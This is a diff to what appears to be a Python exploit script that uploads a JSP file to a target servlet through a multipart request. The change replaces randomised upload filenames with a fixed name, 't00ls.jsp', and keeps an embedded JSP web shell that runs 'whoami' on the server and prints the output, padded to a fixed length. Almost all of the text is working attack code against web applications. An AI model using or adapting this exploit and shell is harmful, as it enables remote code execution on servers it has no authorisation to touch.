@@ -18,13 +18,16 @@ def exp(u,servlet):
         "Content-Type": "multipart/form-data;",
         "Referer": "https://google.com"
 }
-    filename = ''
-    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
-    length = len(chars) - 1
-    random = Random()
-    for i in range(5):
-        filename += chars[random.randint(0, length)]
-    filename = filename + '.jsp'
+    # filename = ''
+    # chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
+    # length = len(chars) - 1
+    # random = Random()
+    # for i in range(5):
+    #     filename += chars[random.randint(0, length)]
+    # filename = filename + '.jsp'
+    #关闭随机文件名上传，减少传输文件数量，如需要传输随机文件名，请将注释消除
+    filename = 't00ls.jsp'
+
     #filename5位
     #code627位
     code=r'''<% {java.io.InputStream in = Runtime.getRuntime().exec(\"whoami\").getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(\"whoami:\"+new String(b));};} %>111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111'''
